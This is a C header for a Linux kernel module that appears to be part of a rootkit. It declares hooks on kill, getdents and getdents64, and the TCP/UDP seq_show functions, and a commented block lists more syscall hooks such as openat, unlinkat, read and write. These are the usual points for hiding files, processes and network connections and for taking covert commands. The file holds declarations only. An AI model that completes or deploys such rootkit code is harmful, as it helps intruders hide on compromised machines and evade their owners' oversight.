#pragma once
#include <linux/module.h>
#include <linux/seq_file.h>

bool hooks_install(void);
void hooks_uninstall(void);
void *hooks_find(const char *symbol);
#define hfind(o, n)                                                         \
  if (NULL == o) {                                                             \
    o = hooks_find(n);                                       \
  }

asmlinkage int64_t h_kill(const struct pt_regs *);

asmlinkage int64_t h_getdents64(const struct pt_regs *);
asmlinkage int64_t h_getdents(const struct pt_regs *);

asmlinkage int32_t h_tcp4_seq_show(struct seq_file *seq, void *v);
asmlinkage int32_t h_tcp6_seq_show(struct seq_file *seq, void *v);

asmlinkage int32_t h_udp4_seq_show(struct seq_file *seq, void *v);
asmlinkage int32_t h_udp6_seq_show(struct seq_file *seq, void *v);

/*
asmlinkage int64_t h_newfstatat(const struct pt_regs *r);
asmlinkage int64_t h_getdents64(const struct pt_regs *r);
asmlinkage int64_t h_getdents(const struct pt_regs *r);
asmlinkage int64_t h_unlinkat(const struct pt_regs *r);
asmlinkage int64_t h_openat(const struct pt_regs *r);
asmlinkage int64_t h_statx(const struct pt_regs *r);
asmlinkage int64_t h_chdir(const struct pt_regs *r);
asmlinkage int64_t h_write(const struct pt_regs *r);
asmlinkage int64_t h_read(const struct pt_regs *r);
asmlinkage int64_t h_open(const struct pt_regs *r);
asmlinkage int64_t h_kill(const struct pt_regs *r);*/
